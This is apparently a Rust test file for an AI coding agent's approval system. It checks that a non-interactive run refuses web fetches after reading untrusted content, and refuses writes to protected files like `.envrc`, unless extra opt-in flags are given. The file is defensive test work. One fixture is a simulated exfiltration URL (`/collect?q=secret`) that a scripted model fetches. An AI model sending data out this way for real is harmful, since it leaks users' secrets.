//! `docs/SECURITY.md`, "Provenance and taint": once a session read untrusted content, its egress asks a person every
//! time, even in yolo. `marv -p` has no person to ask, so `--approve <scope>` alone no longer answers it: the call is
//! refused (listed in `refused`, exit 3, a stderr line naming the flag) unless `--approve-tainted` is given too. An
//! untainted session's `--approve web` is unchanged. A protected-path write (also asked every time) likewise needs
//! `--approve-protected` as well as `--approve files`.
//!
//! The real binary against the oracle's fake OpenRouter. The guards never fetch the internet: the pages are at a
//! documentation address (203.0.113.7, public as far as Marv's address check goes, so no `allow_private`), reached
//! through a local HTTP proxy that answers every request and records what it was asked for.

use std::io::{Read, Write};
use std::sync::{Arc, Mutex};

use marv_guards::{TempDir, headless_steps};
use marv_oracle::script::ScriptCall;
use serde_json::json;

const READ: &str = "http://203.0.113.7/docs/page";
const SEND: &str = "http://203.0.113.7/collect?q=secret";

/// A local HTTP proxy: every request gets a short page; returns its URL and the request lines it saw.
fn proxy() -> (String, Arc<Mutex<Vec<String>>>) {
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let seen = Arc::new(Mutex::new(Vec::new()));
    let log = seen.clone();
    std::thread::spawn(move || {
        for mut stream in listener.incoming().flatten() {
            let mut head = Vec::new();
            let mut buf = [0u8; 4096];
            while !head.windows(4).any(|w| w == b"\r\n\r\n") {
                match stream.read(&mut buf) {
                    Ok(0) | Err(_) => break,
                    Ok(n) => head.extend_from_slice(&buf[..n]),
                }
            }
            let line = String::from_utf8_lossy(&head).lines().next().unwrap_or_default().to_string();
            log.lock().unwrap().push(line);
            let body = "Some page text from the web.";
            let response = format!(
                "HTTP/1.1 200 OK\r\ncontent-type: text/plain\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{body}",
                body.len()
            );
            let _ = stream.write_all(response.as_bytes());
        }
    });
    (format!("http://127.0.0.1:{port}"), seen)
}

fn fetch(id: &str, url: &str) -> ScriptCall {
    ScriptCall { id: Some(id.into()), name: "web_fetch".into(), arguments: json!({ "url": url }) }
}

/// `marv -p` with `steps` (one model reply each) and `args`, web traffic through a fresh proxy. Returns the run and
/// the request lines the proxy saw.
fn run(tag: &str, steps: Vec<Vec<ScriptCall>>, args: &[&str]) -> (marv_guards::Headless, Vec<String>) {
    let (root, config) = (TempDir::new(tag), TempDir::new(&format!("{tag}-config")));
    let (proxy, seen) = proxy();
    let path = std::env::var("PATH").unwrap_or_default();
    let env = [
        ("PATH", path.as_str()),
        ("MARV_GITHUB", "off"),
        ("http_proxy", proxy.as_str()),
        ("HTTP_PROXY", proxy.as_str()),
        // The fake OpenRouter is local: straight there, not through the proxy.
        ("NO_PROXY", "127.0.0.1,localhost"),
        ("no_proxy", "127.0.0.1,localhost"),
    ];
    let out = headless_steps(root.path(), config.path(), steps, args, &env);
    let seen = seen.lock().unwrap().clone();
    (out, seen)
}

/// **Tainted egress is refused with `--approve web` alone.** The first fetch (clean session) runs and taints it; the
/// second, to a new URL prefix, is refused, listed in `refused`, exits 3, and stderr names `--approve-tainted`.
///
/// Proven: removed the `must_ask_refusal` check from `ScopeApprover::approve` → failed (the second fetch reached the
/// proxy, exit 0).
#[test]
fn headless_refuses_tainted_egress_with_approve_alone() {
    let (out, seen) = run("taint-p", vec![vec![fetch("w1", READ)], vec![fetch("w2", SEND)]], &["--approve", "web"]);
    assert_eq!(out.code, Some(3), "{}\n{}", out.result, out.stderr);
    let refused = out.result["refused"].as_array().cloned().unwrap_or_default();
    assert_eq!(refused.len(), 1, "{}", out.result);
    assert_eq!(refused[0]["tool"], "web_fetch");
    assert!(refused[0]["label"].as_str().unwrap_or_default().contains("collect"), "{}", out.result);
    assert!(out.stderr.contains("--approve-tainted"), "{}", out.stderr);
    assert_eq!(seen.len(), 1, "only the first (untainted) fetch may leave: {seen:?}");
    assert!(seen[0].contains("/docs/page"), "{seen:?}");
}

/// **`--approve-tainted` opts in:** the same run fetches both pages and finishes (exit 0, nothing refused).
#[test]
fn headless_approve_tainted_allows_tainted_egress() {
    let (out, seen) =
        run("taint-p-opt", vec![vec![fetch("w1", READ)], vec![fetch("w2", SEND)]], &["--approve", "web", "--approve-tainted"]);
    assert_eq!(out.code, Some(0), "{}\n{}", out.result, out.stderr);
    assert!(out.result.get("refused").is_none(), "{}", out.result);
    assert_eq!(seen.len(), 2, "{seen:?}");
    assert!(seen[1].contains("/collect"), "{seen:?}");
}

/// **An untainted session is unchanged:** `--approve web` approves its fetch, as before.
#[test]
fn headless_approve_web_still_allows_untainted_egress() {
    let (out, seen) = run("taint-p-clean", vec![vec![fetch("w1", SEND)]], &["--approve", "web"]);
    assert_eq!(out.code, Some(0), "{}\n{}", out.result, out.stderr);
    assert!(out.result.get("refused").is_none(), "{}", out.result);
    assert_eq!(seen.len(), 1, "{seen:?}");
    assert!(!out.stderr.contains("--approve-tainted"), "{}", out.stderr);
}

/// **A protected-path write is refused with `--approve files` alone** (it asks a person every time too, `must_ask`);
/// `--approve-protected` opts in.
///
/// Proven: removed the `must_ask_refusal` check from `ScopeApprover::approve` → failed (`.envrc` was written).
#[test]
fn headless_refuses_protected_writes_without_approve_protected() {
    let write = || ScriptCall {
        id: Some("f1".into()),
        name: "write_file".into(),
        arguments: json!({ "path": ".envrc", "content": "export X=1\n" }),
    };
    let (root, config) = (TempDir::new("protected-p"), TempDir::new("protected-p-config"));
    let env = [("MARV_GITHUB", "off")];
    let out = headless_steps(root.path(), config.path(), vec![vec![write()]], &["--approve", "files"], &env);
    assert_eq!(out.code, Some(3), "{}\n{}", out.result, out.stderr);
    assert_eq!(out.result["refused"][0]["tool"], "write_file", "{}", out.result);
    assert!(out.stderr.contains("--approve-protected"), "{}", out.stderr);
    assert!(root.read(".envrc").is_none());

    let args = ["--approve", "files", "--approve-protected"];
    let out = headless_steps(root.path(), config.path(), vec![vec![write()]], &args, &env);
    assert_eq!(out.code, Some(0), "{}\n{}", out.result, out.stderr);
    assert_eq!(root.read(".envrc").as_deref(), Some("export X=1\n"));
}
